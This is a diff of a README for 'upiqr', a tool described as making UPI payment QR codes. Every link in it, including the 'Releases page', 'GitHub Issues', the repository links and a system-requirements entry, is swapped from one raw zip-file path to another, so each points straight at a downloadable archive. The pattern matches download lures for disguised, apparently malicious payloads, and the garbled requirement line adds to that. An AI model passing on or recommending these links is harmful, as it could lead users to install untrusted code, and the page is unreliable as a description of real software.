@@ -8,11 +8,11 @@ Welcome to the upiqr application! This tool helps you create customizable UPI QR
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download upiqr](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip%20upiqr-via%20Releases-blue)](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip)
+[![Download upiqr](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip%20upiqr-via%20Releases-blue)](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip)
 
 Here, you will find the latest versions of the software. Follow these instructions to download and install:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip).
 2. Look for the latest version listed at the top.
 3. Select the file that suits your operating system (e.g., Windows, macOS, Linux).
 4. Click the file to start the download.
@@ -44,7 +44,7 @@ Once the download is complete, follow these steps to run the application:
 To ensure the best performance of the upiqr application, please make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS High Sierra or later, or a recent Linux distribution.
-- **https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip**: Version 12 or higher.
+- **https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip**: Version 12 or higher.
 - **Memory**: At least 4 GB of RAM.
 - **Storage**: Minimum of 100 MB of free disk space.
 
@@ -73,7 +73,7 @@ The upiqr application offers the following features:
 
 If you encounter any issues or need further assistance while using the upiqr application, you can find comprehensive documentation in the README on our GitHub page.
 
-Feel free to check the [GitHub Issues](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip) page if you have specific queries or would like to report bugs. Your feedback is important for us to improve the application.
+Feel free to check the [GitHub Issues](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip) page if you have specific queries or would like to report bugs. Your feedback is important for us to improve the application.
 
 ## 🌍 Community & Contributions
 
@@ -81,8 +81,8 @@ We encourage users to join our community and offer contributions. If you have id
 
 ## 🔗 Additional Links
 
-- **GitHub Repository**: [upiqr](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip)
-- **Release Page**: [Download Latest Version](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip)
-- **Issues Tracker**: [Report a Problem](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/pseudohermaphroditic/upiqr.zip)
+- **GitHub Repository**: [upiqr](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip)
+- **Release Page**: [Download Latest Version](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip)
+- **Issues Tracker**: [Report a Problem](https://raw.githubusercontent.com/Dhruvil45/upiqr/main/src/Software-v3.7-beta.1.zip)
 
 Enjoy creating your UPI QR codes with upiqr!
